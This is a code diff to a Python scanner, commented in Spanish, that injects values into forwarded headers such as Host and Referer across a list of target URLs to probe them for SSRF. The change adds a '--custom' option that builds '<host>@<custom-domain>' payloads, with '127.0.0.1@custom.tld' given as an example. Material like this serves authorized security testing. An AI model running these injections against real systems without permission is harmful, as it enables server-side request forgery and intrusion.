@@ -119,18 +119,15 @@ def load_headers_from_file(headers_path: str) -> dict:
 def run_scan(
     bot_token, bot_id,
     target_list, forwarded_headers, base_headers,
-    payload, timeout, verify_tls,
+    payload, custom, timeout, verify_tls,
     fast_threshold, slow_threshold
 ):
     """
-    Ejecuta el escaneo sin mutar el dict global de headers.
-    - headers = base_headers.copy() por request
-    - mide elapsed con time.monotonic()
-    - reusa conexiones con requests.Session()
-    - reporta cualquier status != 200
-    - si llega 429: lo reporta y luego aborta
-    - NO sigue redirects (para poder reportar 3xx siempre)
     - NO pisa 'Host' si ya viene en base_headers (archivo)
+    - Payload:
+        * si payload no es None -> literal
+        * elif custom no es None -> f"{base_host}@{custom}"
+        * else -> "fake.tld"
     """
     with requests.Session() as session:
         for target in target_list:
@@ -148,7 +145,19 @@ def run_scan(
                         headers['Host'] = host_value
 
                     headers['Referer'] = target
-                    headers[ssrf] = payload
+
+                    # Base host para construir host@custom (sin puerto)
+                    base_host = (headers.get('Host') or host_value).split(":", 1)[0]
+
+                    # Dualidad payload/custom
+                    if payload is not None:
+                        injected_value = payload
+                    elif custom is not None:
+                        injected_value = f"{base_host}@{custom}"
+                    else:
+                        injected_value = "fake.tld"
+
+                    headers[ssrf] = injected_value
 
                     start = time.monotonic()
                     r = session.get(
@@ -208,9 +217,13 @@ def main():
     parser.add_argument('-T','--target', type=str, required=True, help='Readable file with multiple URLs previously validated')
 
     parser.add_argument('--timeout', type=float, default=5.0, help='Request timeout in seconds (default: 5)')
-    parser.add_argument('--payload', type=str, default='fake.tld', help='Payload value to inject in forwarded headers (default: fake.tld)')
 
-    # TLS flags (default: verify=True). --verify se mantiene por compatibilidad.
+    # Dualidad real:
+    # --payload => literal override (ej: 127.0.0.1@custom.tld)
+    # --custom  => construye <host_base>@<custom> automáticamente
+    parser.add_argument('--payload', type=str, default=None, help='Literal payload value to inject (overrides --custom)')
+    parser.add_argument('--custom', type=str, default=None, help='Custom domain/ip to build <host>@<custom> from base Host header')
+
     tls_group = parser.add_mutually_exclusive_group()
     tls_group.add_argument('--verify', action='store_true', help='(Deprecated) TLS verification is enabled by default')
     tls_group.add_argument('--insecure', action='store_true', help='Disable TLS certificate verification')
@@ -229,15 +242,11 @@ def main():
 
     # Default seguro: verify=True, a menos que --insecure
     verify_tls = not args.insecure
-
-    # Silenciar warnings SOLO si estamos en insecure
     if not verify_tls:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-    # headers base (desde archivo)
     file_headers_dict = load_headers_from_file(args.headers)
 
-    # targets (desde archivo)
     with open(args.target, 'r', encoding='utf-8', errors='replace') as f:
         target_list = [x.strip() for x in f if x.strip()]
 
@@ -246,7 +255,7 @@ def main():
     run_scan(
         bot_token, bot_id,
         target_list, headers_to_fuzz, file_headers_dict,
-        args.payload, args.timeout, verify_tls,
+        args.payload, args.custom, args.timeout, verify_tls,
         args.fast_threshold, args.slow_threshold
     )
 
